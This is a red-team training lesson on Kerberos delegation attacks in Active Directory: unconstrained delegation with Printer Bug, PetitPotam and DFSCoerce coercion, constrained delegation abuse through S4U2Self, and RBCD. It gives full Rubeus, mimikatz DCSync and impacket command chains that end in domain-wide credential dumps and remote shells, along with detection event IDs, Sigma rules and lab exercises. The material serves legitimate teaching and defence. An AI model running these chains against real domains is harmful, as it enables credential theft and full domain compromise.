---
title: "Delegation Attacks — Unconstrained, Constrained, and RBCD Deep Dive"
tags: [red-team, active-directory, kerberos, delegation, unconstrained-delegation,
  constrained-delegation, RBCD, S4U2Self, S4U2Proxy, SpoolSample, printer-bug,
  T1558.001, T1134.001, ATT&CK, detection, BloodHound]
module: 08-RedTeam-03
day: 543
related_topics:
  - Custom Payload Development (Day 542)
  - Shadow Credentials and PKINIT (Day 544)
  - RBCD Attack (Day 514) — introductory coverage
  - Domain Dominance (Day 499)
  - Offshore Lab Episode 3 (Day 537)
---

# Day 543 — Delegation Attacks: Unconstrained, Constrained, and RBCD Deep Dive

> "Kerberos delegation was designed so that a web server could authenticate
> to a database as the user who hit the web server — without knowing the user's
> password. It is a legitimate, necessary feature. It is also one of the most
> exploited mechanisms in Active Directory, because every delegation configuration
> is an implicit trust statement: 'this account may impersonate any user'.
> When an attacker controls a delegating account, that statement works for them."
>
> — Ghost

---

## Goals

Understand all three Kerberos delegation types at the protocol level.
Execute the Unconstrained Delegation + Printer Bug attack to capture a DC TGT.
Execute Constrained Delegation S4U2Self abuse to impersonate any domain user.
Execute RBCD from first principles with deeper understanding than Day 514.
Write detection logic for all three delegation attack types.

**Prerequisites:** Day 514 (RBCD intro), Day 537 (Kerberos in Offshore lab),
Kerberos TGT/TGS fundamentals (Day 042 or earlier).
**Time budget:** 5 hours.

---

## Part 1 — Delegation Types Overview

```
Unconstrained Delegation (TrustedForDelegation = True):
  → The delegating computer/service can impersonate ANY user
    to ANY service in the domain
  → When a user authenticates to the service, their TGT is sent to the
    delegating host and CACHED in LSASS
  → Attacker who controls this host can extract those TGTs
  → Set on: computers via AD attribute userAccountControl flag
  → Identify: BloodHound → "Computers with Unconstrained Delegation"

Constrained Delegation (TrustedToAuthForDelegation + msDS-AllowedToDelegateTo):
  → The delegating account can impersonate users to SPECIFIC services only
  → Two flavours:
    Protocol Transition (S4U2Self enabled): service can impersonate ANY user,
      even if they did not authenticate to it first
    Kerberos-only (no S4U2Self): only works if the user first authenticates
  → Most valuable from attacker perspective: Protocol Transition
  → Identify: BloodHound → "Computers/Users with Constrained Delegation"
    or: Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"}

Resource-Based Constrained Delegation (RBCD — msDS-AllowedToActOnBehalfOf):
  → Delegation is configured on the RESOURCE (target), not the caller
  → Who can delegate to this resource is controlled by the resource's attribute
  → Any account with WRITE access to the target's msDS-AllowedToActOnBehalfOf
    can configure RBCD → allowing any account they control to impersonate
    any user to the target
  → Most powerful for attackers with GenericWrite on a computer object
```

---

## Part 2 — Unconstrained Delegation + Printer Bug

### Finding Unconstrained Delegation Hosts

```powershell
# From any domain user context
Get-ADComputer -Filter {TrustedForDelegation -eq $True} `
    -Properties TrustedForDelegation, ServicePrincipalName |
    Select-Object Name, DNSHostName, ServicePrincipalName

# BloodHound query:
# MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name, c.distinguishedname
# Pre-built: "Computers with Unconstrained Delegation"

# Note: Domain Controllers always have unconstrained delegation — exclude them
# Only flag: non-DC machines with TrustedForDelegation = True
```

### The Printer Bug (SpoolSample / MS-RPRN Coercion)

```
Problem: to collect a TGT via unconstrained delegation, you need a victim
  to authenticate to your compromised unconstrained delegation host.
  You cannot wait for random users — you need SPECIFIC accounts (e.g., the DC).

Solution: Printer Bug (CVE-2021-1678 related, but originally reported ~2018)
  The MS-RPRN protocol has a function RpcRemoteFindFirstPrinterChangeNotification
  that coerces a machine to authenticate to any specified target using its
  MACHINE ACCOUNT
  
  If you coerce DC01$ to authenticate to PRINT-SERVER (unconstrained delegation):
  → DC01$'s TGT arrives at PRINT-SERVER
  → Rubeus or Mimikatz captures it from LSASS
  → You use DC01$'s TGT to DCSync the domain

Attack flow:
  1. Identify PRINT-SERVER (unconstrained delegation host) — you control it
  2. On PRINT-SERVER: monitor for incoming TGTs (Rubeus monitor mode)
  3. From any host: trigger RpcRemoteFindFirstPrinterChangeNotification
     → coerce DC01 to authenticate to PRINT-SERVER
  4. DC01$'s TGT appears in LSASS on PRINT-SERVER
  5. Extract the TGT and use it for DCSync
```

```powershell
# Step 1: On PRINT-SERVER (compromised unconstrained delegation host)
# Start Rubeus in monitor mode — captures all new TGTs as they arrive:
.\Rubeus.exe monitor /interval:5 /nowrap

# Step 2: From any host — trigger the Printer Bug against DC01
# Tool: SpoolSample (C# PoC)
.\SpoolSample.exe DC01.corp.local PRINT-SERVER.corp.local

# Alternative triggers (if Print Spooler is disabled):
# PetitPotam (MS-EFSRPC coercion): 
.\PetitPotam.py -u user -p 'pass' -d corp.local \
    PRINT-SERVER.corp.local DC01.corp.local

# DFSCoerce (MS-DFSNM):
python3 dfscoerce.py -u user -p 'pass' \
    PRINT-SERVER.corp.local DC01.corp.local

# Step 3: Rubeus on PRINT-SERVER captures DC01$'s TGT base64-encoded

# Step 4: Use the TGT
.\Rubeus.exe ptt /ticket:<BASE64_TGT>
# Now running as DC01$ — perform DCSync:
.\mimikatz.exe "lsadump::dcsync /domain:corp.local /all /csv" "exit"
```

```
Detection:
  Event ID 4769 (Kerberos TGS request) on DC:
    ServiceName = PRINT-SERVER$ (machine accounts requesting tickets
    for a print server are somewhat normal — requires baseline)

  Sysmon Event ID 3 (Network connection):
    PRINT-SERVER initiating a connection to DC's port 445 immediately after
    receiving a TGS → lateral movement indicator

  Event ID 4624 (Logon):
    LogonType = 3 (Network logon) from DC01$ to PRINT-SERVER — anomalous

  Best detection: monitor for Print Spooler (spoolsv.exe) establishing
  outbound network connections to non-print-server destinations
```

---

## Part 3 — Constrained Delegation with Protocol Transition

### Finding Constrained Delegation Accounts

```powershell
# Users and computers with msDS-AllowedToDelegateTo configured:
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} `
    -Properties msDS-AllowedToDelegateTo, userAccountControl |
    Select-Object Name, msDS-AllowedToDelegateTo, userAccountControl

# Accounts with Protocol Transition (TrustedToAuthForDelegation flag set):
# userAccountControl flag: 0x1000000 (TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION)
Get-ADObject -Filter {
    userAccountControl -band 0x1000000
} -Properties userAccountControl, msDS-AllowedToDelegateTo |
    Select-Object Name, msDS-AllowedToDelegateTo
```

### S4U2Self and S4U2Proxy Attack

```
Protocol Transition attack:
  A service with S4U2Self enabled (TrustedToAuthForDelegation) can request
  a service ticket for ANY domain user — as if that user authenticated first.
  The resulting ticket is a valid TGS for the service account's own SPN.
  
  Then S4U2Proxy:
  Using the S4U2Self TGS as "evidence" of user authentication, the service
  requests a TGS on behalf of that user for the services in its AllowedToDelegateTo list.

  Result: you can impersonate Domain Admin to any service listed in
  msDS-AllowedToDelegateTo for the delegating account.
```

```bash
# Scenario: SVCACCOUNT has constrained delegation to cifs/FILESERVER.corp.local
# You have SVCACCOUNT's credentials (from Kerberoasting)

# Step 1: S4U2Self — request a ticket as Administrator for SVCACCOUNT's service
proxychains impacket-getST \
    corp.local/SVCACCOUNT:'cracked_pass' \
    -spn cifs/FILESERVER.corp.local \
    -impersonate administrator \
    -dc-ip <DC_IP>

# Output: administrator.ccache (TGS for FILESERVER as administrator)

# Step 2: Use the ticket
export KRB5CCNAME=administrator@cifs_FILESERVER.corp.local@CORP.LOCAL.ccache
proxychains impacket-smbclient -k -no-pass \
    corp.local/administrator@FILESERVER.corp.local

# Or: psexec for shell
proxychains impacket-psexec -k -no-pass \
    corp.local/administrator@FILESERVER.corp.local
```

```
Key constraint: you can ONLY impersonate users to services listed in
  msDS-AllowedToDelegateTo. If it says cifs/FILESERVER, you can get a ticket
  for \\FILESERVER but not for \\DC01.
  
  Exception: if the DC has constrained delegation, impersonating DA to the
  DC's service is effectively a domain compromise.

  BloodHound edge: ConstrainedDelegate
  Query: which constrained delegation services allow delegation to DC services?
```

---

## Part 4 — RBCD: Full Protocol Walk-Through

```
Day 514 covered RBCD tactically. Today: understand every protocol step.

RBCD attack requires:
  1. A target computer object (VICTIM-PC) where you want admin access
  2. Write access (GenericWrite) to VICTIM-PC's msDS-AllowedToActOnBehalfOf
  3. An account whose SPN you control (FakeComputer$ or an existing account
     with a SPN — created machine accounts automatically get SPNs)

Protocol step-by-step:
  1. Write FakeComputer$ into VICTIM-PC's msDS-AllowedToActOnBehalfOf
     → This tells the KDC: "FakeComputer$ may delegate to VICTIM-PC"

  2. S4U2Self: FakeComputer$ requests a TGS for any user (e.g., administrator)
     to FakeComputer$'s own SPN (HOST/FakeComputer)
     → The KDC issues this because FakeComputer$ is a legitimate account
     → The resulting TGS says: administrator wants to use FakeComputer$

  3. S4U2Proxy: FakeComputer$ presents the S4U2Self TGS to the KDC and asks
     for a TGS for cifs/VICTIM-PC impersonating administrator
     → The KDC checks VICTIM-PC's msDS-AllowedToActOnBehalfOf
     → FakeComputer$ is in the list → KDC issues the cifs/VICTIM-PC ticket
     as administrator

  4. Use the ticket for cifs/VICTIM-PC → admin access to VICTIM-PC
```

```bash
# Step 1: Identify a computer with GenericWrite via BloodHound
# Edge: GenericWrite from your_user to VICTIM-PC$

# Step 2: Create a machine account (requires ms-DS-MachineAccountQuota > 0)
proxychains impacket-addcomputer \
    corp.local/your_user:'pass' \
    -dc-ip <DC_IP> \
    -computer-name 'ATTK01$' \
    -computer-pass 'TempPass!123'

# Alternatively if MachineAccountQuota = 0 — use an existing SPN account
# (Kerberoastable accounts that you cracked have SPNs)

# Step 3: Set RBCD on VICTIM-PC
proxychains impacket-rbcd \
    corp.local/your_user:'pass' \
    -dc-ip <DC_IP> \
    -action write \
    -delegate-to 'VICTIM-PC$' \
    -delegate-from 'ATTK01$'

# Verify:
proxychains impacket-rbcd \
    corp.local/your_user:'pass' \
    -dc-ip <DC_IP> \
    -action read \
    -delegate-to 'VICTIM-PC$'

# Step 4: S4U to get administrator ticket for VICTIM-PC
proxychains impacket-getST \
    corp.local/'ATTK01$':'TempPass!123' \
    -spn cifs/VICTIM-PC.corp.local \
    -impersonate administrator \
    -dc-ip <DC_IP>

# Step 5: Use it
export KRB5CCNAME=administrator@cifs_VICTIM-PC.corp.local@CORP.LOCAL.ccache
proxychains impacket-wmiexec -k -no-pass \
    corp.local/administrator@VICTIM-PC.corp.local

# Cleanup:
proxychains impacket-rbcd corp.local/your_user:'pass' \
    -dc-ip <DC_IP> -action remove \
    -delegate-to 'VICTIM-PC$' -delegate-from 'ATTK01$'
proxychains impacket-computer corp.local/your_user:'pass' \
    -dc-ip <DC_IP> -computer-name 'ATTK01$' --delete
```

---

## Part 5 — Detection for All Three Delegation Attack Types

```
Unconstrained Delegation:
  1. Inventory: non-DC hosts with TrustedForDelegation = True are a risk.
     Any such host should be treated as a Tier-0 asset.
  2. Event ID 4624 LogonType=3 to a non-DC non-print-server from DC machine
     accounts is anomalous.
  3. MS-RPRN coercion: Sysmon Event ID 3 from spoolsv.exe to non-printer
     destination. Sigma:
     EventID: 3
     Image|endswith: '\spoolsv.exe'
     DestinationPort: 445
     → Tune out legitimate print server IPs

Constrained Delegation (S4U2Self abuse):
  1. Event ID 4769: TGS request where the ticket is for a user who has NOT
     previously authenticated this session (S4U2Self generates a TGS without
     a preceding AS-REQ from the impersonated user)
  2. Correlate: S4U requests appear with PAType: PA-FOR-USER in the Kerberos
     pre-auth data — visible in packet captures (Zeek logging)

RBCD:
  1. Event ID 5136 (Directory Service Object Modified):
     AttributeLDAPDisplayName = msDS-AllowedToActOnBehalfOf
     Any modification to this attribute on a computer object
  2. Event ID 4741 (Computer Account Created):
     Combined with 5136 shortly after → high-confidence RBCD setup
  Sigma:
    EventID: 5136
    AttributeLDAPDisplayName: 'msDS-AllowedToActOnBehalfOf'
    → Alert on any write to this attribute outside of scheduled maintenance
```

---

## Exercises

1. In a lab AD environment: identify all computers with unconstrained delegation
   that are not domain controllers using PowerShell. Enable the Print Spooler
   on a second lab host and coerce it to authenticate to the unconstrained
   delegation host. Capture the arriving TGT with Rubeus monitor mode.
2. Find an account in your lab with constrained delegation configured (or create
   one). Use getST with S4U2Self to request a TGS for "administrator" to the
   delegated service. Verify the resulting ccache contains a ticket for the
   administrator user.
3. Execute the full RBCD chain in your lab from a standard domain user with
   GenericWrite on a computer object to obtaining a SYSTEM shell on that
   computer. Time yourself — target under 15 minutes.
4. Enable Event ID 5136 auditing (Advanced Audit Policy: DS Access → Audit
   Directory Service Changes). Execute the RBCD setup (step 3). Capture the
   5136 event and write a Sigma rule that would alert on it in production.
5. Explain why RBCD requires at least one controlled account with a SPN.
   What happens if you write your own user account (not a computer) into
   msDS-AllowedToActOnBehalfOf? Does it work? Why or why not?

---

## Key Takeaways

1. All three delegation types share a common primitive: a service can act on
   behalf of a user. The attack surface difference is: who controls the
   delegating account (unconstrained = attacker must compromise it;
   constrained = attacker cracks its password; RBCD = attacker writes to a
   target's attribute with GenericWrite).
2. The Printer Bug (and all coercion techniques: PetitPotam, DFSCoerce) turns
   unconstrained delegation from "wait for an admin to log in" to "coerce a DC
   to authenticate right now." This makes unconstrained delegation a critical
   risk on any host a non-DC compromise could reach.
3. RBCD is the most broadly exploitable delegation attack because it only
   requires GenericWrite on any computer object — a permission that is often
   granted to helpdesk accounts, non-default ACLs on OU, or through nested
   group membership. BloodHound's GenericWrite edge to computer objects is
   the key indicator.
4. S4U2Self with Protocol Transition is the mechanism that makes constrained
   delegation dangerous for impersonation: the service does not need the user
   to have authenticated at all. It simply requests a ticket as that user from
   the KDC, and the KDC issues it based on the service's delegation flag.
5. Detection of all three requires Active Directory auditing of specific events
   (5136, 4769 analysis, 4624 anomalies) that most organisations do not enable
   by default. Enabling DS Access → Audit Directory Service Changes is the
   single most important defensive step for catching RBCD setup.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q543.1, Q543.2 …).

---

## Navigation

← Previous: [Day 542 — Custom Payload Development](DAY-0542-Custom-Payload-Development-Process-Injection.md)
→ Next: [Day 544 — Shadow Credentials and PKINIT Abuse](DAY-0544-Shadow-Credentials-PKINIT.md)
